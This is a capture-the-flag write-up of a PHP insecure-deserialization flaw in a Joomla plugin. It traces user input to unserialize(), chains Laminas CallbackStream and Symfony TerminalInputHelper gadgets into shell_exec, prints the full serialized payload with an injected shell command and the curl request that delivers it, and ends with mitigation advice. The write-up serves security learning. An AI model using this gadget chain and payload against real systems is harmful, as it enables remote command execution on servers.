# Provisioneds

During the enumeration of the target, a Joomla installation was identified exposing a custom system plugin named **Gatehouse**. Further source-code analysis revealed that the plugin handled a `ledger` parameter through an administrative endpoint:

```
/administrator/index.php?option=com_provision&view=dispatch&task=ledger.import
```

The interesting part of the implementation was the way this parameter was processed. The application passed the user-controlled `ledger` value directly to PHP's `unserialize()` function:

```
$data = @unserialize($ledger);
```

This immediately raised the possibility of a **PHP insecure deserialization vulnerability**.

The application did not merely deserialize primitive values. Because PHP serialization supports objects, an attacker could potentially provide serialized objects belonging to classes already available in the Joomla installation. If those classes contain useful magic methods or behaviors that can be chained together, deserialization can lead to unintended application behavior and potentially **arbitrary command execution**.

---

# Identify the vulnerable data flow

## User-Controlled Input
The first step is to identify where external input enters the application and trace how it reaches the vulnerable functionality. In `Gatehouse.php`, we identified a relevant entry point in the `onAfterRoute()` method:

```php
public function onAfterRoute(AfterRouteEvent $event): void
{
    $app = $event->getApplication();

    if (!$this->isAdminImportContext($app)) {
        return;
    }

    $ledger = $app->getInput()->getRaw('ledger', '');

    if (!is_string($ledger) || trim($ledger) === '') {
        return;
    }

    (new GatehouseRepository())->importMonthlyLedger($ledger);
}
```

The method receives the current Joomla application through the event object. Before processing any user-controlled data, it calls `isAdminImportContext()`. The method determines whether the current request matches the expected import context:

```php
private function isAdminImportContext($app): bool
{
    if (!$app->isClient('administrator')) {
        return false;
    }

    $input = $app->getInput();

    return $input->getCmd('option') === 'com_provision'
        && $input->getCmd('view') === 'dispatch'
        && $input->getCmd('task') === 'ledger.import';
}
```

The first check is:

```php
$app->isClient('administrator')
```

This checks that Joomla is processing the request through its administrator application client. It does not itself verify that the requester is an administrator. Therefore, this check can be bypassed as long as the request is processed through the administrator application client.

The remaining checks compare three request parameters:

```text
option = com_provision
view   = dispatch
task   = ledger.import
```

Therefore, the request must reach the administrative Joomla entry point with the expected component, view, and task before execution continues. Once these conditions are satisfied, `onAfterRoute()` retrieves the `ledger` parameter:

```php
$ledger = $app->getInput()->getRaw('ledger', '');
```

The value is then passed directly to the repository:

```php
(new GatehouseRepository())->importMonthlyLedger($ledger);
```

Therefore, we'll inspect `importMonthlyLedger()` to determine how this user-controlled string is processed.

## Insecure deserialization

With the input flow established, the next step is to inspect `importMonthlyLedger()` and determine how the `ledger` value is processed. The method is located in `GatehouseRepository.php`:

```php
public function importMonthlyLedger(string $ledger): array
{
    if (trim($ledger) === '') {
        return $this->result('rejected', 'FAILED', 'Update could not be processed.');
    }

    $data = @unserialize($ledger);

    if (!is_array($data)) {
        return $this->result('rejected', 'FAILED', 'Update could not be processed.');
    }

    return $this->importMonthlyRecords($data);
}
```

The relevant operation is:

```php
$data = @unserialize($ledger);
```

The `ledger` parameter originated from the HTTP request and is passed to `unserialize()` without validating its serialized structure beforehand. The`unserialize()` converts a serialized PHP string back into its original PHP representation. This is significant because PHP serialization supports not only primitive values and arrays, but also objects.

Therefore, an attacker-controlled value is not restricted to the array structure the application expects. If the serialized input contains an object, PHP can instantiate that object during deserialization. The following check occurs only **after** deserialization:

```php
if (!is_array($data)) {
    return $this->result('rejected', 'FAILED', 'Update could not be processed.');
}
```

This does not prevent object instantiation. The object has already been processed by `unserialize()` before the application verifies that the final result is an array. Therefore, the next step is to identify suitable classes available in the application and determine whether their properties can be controlled through the serialized payload.


## Object Creation

With the deserialization primitive identified, the next step is to find existing classes that can be chained into a usable execution path. The first relevant class is `Laminas\Diactoros\CallbackStream`, located under the application's installed dependencies.

Its important property is:

```php
protected $callback;
```

The class later uses this property when the object is converted to a string:

```php
public function __toString(): string
{
    return $this->getContents();
}
```

`getContents()` retrieves the callback and invokes it:

```php
$callback = $this->detach();
return $callback !== null ? (string) $callback() : '';
```

This makes `CallbackStream` useful as the first part of the chain: if its `callback` property can be controlled through deserialization, the corresponding callable can be triggered when the object is converted to a string. The second class is `Symfony\Component\Console\Helper\TerminalInputHelper`.

Its `finish()` method eventually reaches:

```php
shell_exec('stty '.$this->initialState);
```

The `initialState` property is therefore relevant because its value becomes part of the command passed to `shell_exec()`. The two classes can be connected through a PHP callable represented by an object and a method name: `CallbackStream → callback → [TerminalInputHelper, "finish"]`.When the `CallbackStream` object is converted to a string, the following execution path is established:

```text
__toString()
    -> getContents()
        -> callback()
            -> TerminalInputHelper::finish()
                -> shell_exec(...)
```

This provides a usable object chain composed entirely of classes already available in the target application. The next step is to reproduce this object graph using PHP's serialization format and pass the resulting serialized data through the vulnerable `ledger` parameter.

## Exploitation

At this stage, the vulnerable data flow and the required object chain have already been identified. The final step is to construct the serialized object graph and deliver it through the vulnerable `ledger` parameter.

### 1. Creating the Ledger

The payload is constructed as a serialized PHP array containing the fields expected by the application. The `month` field is particularly important because, instead of containing a normal string, it contains a serialized `Laminas\Diactoros\CallbackStream` object.

The relevant structure is:

```text
a:1:{
    i:0;
    a:2:{
        s:5:"month";
        O:32:"Laminas\Diactoros\CallbackStream":1:{
            s:11:"\0*\0callback";
            a:2:{
                i:0;
                O:52:"Symfony\Component\Console\Helper\TerminalInputHelper":6:{
                    s:65:"\0Symfony\Component\Console\Helper\TerminalInputHelper\0inputStream";N;
                    s:66:"\0Symfony\Component\Console\Helper\TerminalInputHelper\0initialState";
                    s:44:"; /readflag > /var/www/html/flag.txt 2>&1; #";
                    s:66:"\0Symfony\Component\Console\Helper\TerminalInputHelper\0signalToKill";i:0;
                    s:68:"\0Symfony\Component\Console\Helper\TerminalInputHelper\0signalHandlers";a:0:{}
                    s:67:"\0Symfony\Component\Console\Helper\TerminalInputHelper\0targetSignals";a:0:{}
                    s:62:"\0Symfony\Component\Console\Helper\TerminalInputHelper\0withStty";b:1;
                }
                i:1;
                s:6:"finish";
            }
        }
        s:8:"packages";
        i:1;
    }
}
```

The outer structure represents an array containing one entry with the expected `month` and `packages` fields. The `month` value, however, is an object rather than a string. The first object is `Laminas\Diactoros\CallbackStream`. Its protected `callback` property is represented using PHP's visibility notation:

`"\0*\0callback"`

The value of this property is an array containing two elements: the `TerminalInputHelper` object and the method name `finish`. This produces a PHP callable equivalent to:

`[TerminalInputHelper object, "finish"]`

This relationship is important because `CallbackStream::getContents()` invokes its stored callback. Therefore, once the object is reconstructed and the relevant method is reached, execution can continue into `TerminalInputHelper::finish()`. The second object is `Symfony\Component\Console\Helper\TerminalInputHelper`. The property of interest is its private `initialState` member:

`"\0Symfony\Component\Console\Helper\TerminalInputHelper\0initialState"`

Its value is controlled by the serialized payload:

`"; /readflag > /var/www/html/flag.txt 2>&1; #"`

This is the critical connection in the gadget chain because `finish()` subsequently uses `initialState` when constructing the argument passed to `shell_exec()`. The resulting execution path is therefore:

`ledger` → `unserialize()` → `CallbackStream` → `callback` → `TerminalInputHelper::finish()` → `initialState` → `shell_exec()`

At this point, the object graph has been constructed. It now needs to be transported through the HTTP request.

### 2. Sending the Serialized Payload

The serialized payload must be URL-encoded before being included in the `ledger` parameter because the serialized data contains characters with special meaning in an HTTP URL, such as `:`, `{`, `}`, `"`, `\`, and null bytes. The serialization defines the PHP object graph, while URL encoding only prepares that serialized data for HTTP transport. For example, the serialized payload begins with `a:1:{i:0;a:2:{s:5:"month";O:32:"Laminas\Diactoros\CallbackStream"...`. The encoded payload is then supplied to the `ledger` parameter in the following request:

```bash
curl "http://localhost:1337/administrator/index.php?option=com_provision&view=dispatch&task=ledger.import&ledger=a%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bs%3A5%3A%22month%22%3BO%3A32%3A%22Laminas%5CDiactoros%5CCallbackStream%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00callback%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A52%3A%22Symfony%5CComponent%5CConsole%5CHelper%5CTerminalInputHelper%22%3A6%3A%7Bs%3A65%3A%22%00Symfony%5CComponent%5CConsole%5CHelper%5CTerminalInputHelper%00inputStream%22%3BN%3Bs%3A66%3A%22%00Symfony%5CComponent%5CConsole%5CHelper%5CTerminalInputHelper%00initialState%22%3Bs%3A44%3A%22%3B%20%2Freadflag%20%3E%20%2Fvar%2Fwww%2Fhtml%2Fflag.txt%202%3E%261%3B%20%23%22%3Bs%3A66%3A%22%00Symfony%5CComponent%5CConsole%5CHelper%5CTerminalInputHelper%00signalToKill%22%3Bi%3A0%3Bs%3A68%3A%22%00Symfony%5CComponent%5CConsole%5CHelper%5CTerminalInputHelper%00signalHandlers%22%3Ba%3A0%3A%7B%7Ds%3A67%3A%22%00Symfony%5CComponent%5CConsole%5CHelper%5CTerminalInputHelper%00targetSignals%22%3Ba%3A0%3A%7B%7Ds%3A62%3A%22%00Symfony%5CComponent%5CConsole%5CHelper%5CTerminalInputHelper%00withStty%22%3Bb%3A1%3B%7Di%3A1%3Bs%3A6%3A%22finish%22%3B%7D%7Ds%3A8%3A%22packages%22%3Bi%3A1%3B%7D%7D"
```

The URL-encoded value is decoded during HTTP parameter processing before the application handles the `ledger` parameter. The application therefore receives the original serialized representation and passes it into the vulnerable deserialization path.

Once the payload has been processed, the resulting file can be retrieved from the target:

```bash
curl "http://154.57.164.65:32696/flag.txt"
```
## Mitigation

The vulnerability can be mitigated by eliminating the unsafe deserialization of user-controlled data. The `ledger` parameter should not be passed directly to `unserialize()`. Instead, the application should use a safe data format such as JSON and validate the resulting structure against the expected schema. If PHP serialization is strictly required, the use of `unserialize()` must be restricted with `allowed_classes => false` or an explicit allowlist containing only the classes that are genuinely required. However, the preferred solution is to avoid PHP object deserialization for untrusted input entirely.

The application should also enforce authorization at the application level. Checking that the request is targeting Joomla's `administrator` client does not establish that the requester is authenticated or authorized to perform the import operation. The import functionality should therefore require an authenticated user with the appropriate permissions. Finally, the application should validate the expected ledger fields and their types before processing them. In this case, values such as `month` and `packages` should be treated as ordinary data rather than allowing arbitrary serialized objects to reach the application.

The key remediation points are:

* Do not deserialize untrusted PHP serialized data.
* Prefer JSON or another data-only format for the ledger.
* If `unserialize()` cannot be removed, disable or strictly restrict object deserialization.
* Enforce authentication and authorization before executing the import functionality.
* Validate the structure, types, and allowed values of the imported ledger data.

The root cause is not the individual gadget classes used during exploitation. The underlying issue is that attacker-controlled input reaches a dangerous deserialization operation without sufficient validation or object restrictions.

